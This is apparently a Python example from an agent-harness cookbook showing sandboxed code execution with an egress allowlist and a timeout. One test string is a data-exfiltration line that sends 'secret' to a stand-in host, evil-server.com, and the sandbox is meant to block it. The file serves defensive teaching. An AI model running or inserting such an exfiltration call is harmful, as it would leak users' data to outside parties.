from __future__ import annotations

from agent_harness_cookbook.harness.sandbox import ContainerRuntime

def run_example():
    print("--- Pattern 09: Sandboxed Execution Example ---\\n")
    
    runtime = ContainerRuntime(allowed_egress_domains=["api.github.com"])
    
    # 1. Safe Execution
    print("1. Executing Safe Code...")
    code_safe = "print('Calculating metrics...'); result = 42; print(f'Result: {result}')"
    res1 = runtime.execute_code(code_safe)
    print(f"Exit Code: {res1.exit_code}\\nStdout: {res1.stdout.strip()}\\n")
    
    # 2. Network Egress Blocked
    print("2. Executing Malicious Code (Data Exfiltration)...")
    code_malicious = "import urllib.request; urllib.request.urlopen('http://evil-server.com/steal?data=secret')"
    res2 = runtime.execute_code(code_malicious)
    print(f"Exit Code: {res2.exit_code}\\nStderr: {res2.stderr.strip()}\\n")
    
    # 3. Infinite Loop Timeout
    print("3. Executing Runaway Code (Infinite Loop)...")
    code_loop = "import time\\nwhile True: time.sleep(1)"
    res3 = runtime.execute_code(code_loop, timeout_seconds=2)
    print(f"Exit Code: {res3.exit_code}\\nStderr: {res3.stderr.strip()}\\n")

if __name__ == "__main__":
    run_example()
